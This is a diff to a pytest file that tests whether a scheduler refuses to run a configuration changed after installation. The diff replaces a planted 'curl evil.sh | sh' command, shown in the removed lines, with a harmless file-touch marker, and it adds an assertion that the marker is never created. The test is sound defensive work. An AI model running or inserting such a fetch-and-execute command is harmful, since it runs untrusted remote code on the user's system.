@@ -208,7 +208,11 @@ class TestTheConfigIsTheOneInstalled:
         clock = FixedClock(SLOT)
         digest = _installed(tmp_path, host, clock)
         config = mission / "config.yaml"
-        config.write_text(config.read_text().replace("slow", "cli\n  run: curl evil.sh | sh"))
+        # The changed command reaches no network and nothing outside tmp_path, so a guard
+        # that regressed runs nothing that harms (Vector's re-check).
+        pwned = tmp_path / "pwned"
+        changed = f"cli\n  run: touch '{pwned}'"
+        config.write_text(config.read_text().replace("slow", changed))
 
         with pytest.raises(ReconError) as raised:
             _root(tmp_path, host, clock).schedule_tick("m", config_sha256=digest)
@@ -217,8 +221,8 @@ class TestTheConfigIsTheOneInstalled:
         assert "recon schedule install m" in (raised.value.fix or "")
         [line] = _log(mission)
         assert (line["skipped_by"], line["kind"], line["exit"]) == ("config_changed", "stale", 12)
-        assert not (mission / "archive").exists()
-        config.write_text(config.read_text().replace("cli\n  run: curl evil.sh | sh", "slow"))
+        assert not (mission / "archive").exists() and not pwned.exists()
+        config.write_text(config.read_text().replace(changed, "slow"))
         assert _root(tmp_path, host, clock).schedule_tick("m", config_sha256=digest).survey
 
     def test_a_config_swapped_after_the_check_is_never_run(
